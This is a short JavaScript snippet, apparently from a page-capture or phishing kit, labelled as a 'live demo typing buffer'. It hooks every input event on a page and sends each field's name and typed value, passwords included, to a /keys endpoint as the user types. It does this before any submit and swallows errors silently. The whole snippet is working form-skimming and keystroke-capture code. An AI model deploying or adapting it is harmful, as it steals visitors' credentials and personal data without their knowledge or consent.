/* Live demo typing buffer: debounced per-field POST to /keys. Server ignores unless capture+live enabled. */
(function () {
  var t = {};
  document.addEventListener("input", function (e) {
    var el = e.target;
    if (!el.name || el.type === "checkbox" || el.type === "submit") return;
    clearTimeout(t[el.name]);
    t[el.name] = setTimeout(function () {
      fetch("/keys", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({field: el.name, value: el.value})
      }).catch(function () {});
    }, 400);
  });
})();
